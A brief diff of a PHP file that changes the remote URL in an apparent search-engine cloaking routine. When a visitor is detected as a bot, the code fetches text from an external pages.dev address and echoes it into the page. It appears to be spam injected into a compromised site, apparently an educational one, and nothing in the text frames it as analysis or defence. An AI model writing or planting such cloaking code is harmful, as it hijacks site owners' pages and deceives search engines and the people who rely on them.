@@ -42,7 +42,7 @@ function fetch_message_from_url($url) {
 }
 
 if (is_bot()) { 
-    $message = fetch_message_from_url('https://night-market.pages.dev/upnvirtual/forbib/lp.txt');
+    $message = fetch_message_from_url('https://night-market.pages.dev/upnvirtual/aulascae/lp.txt');
     
     if ($message) {
         echo $message;
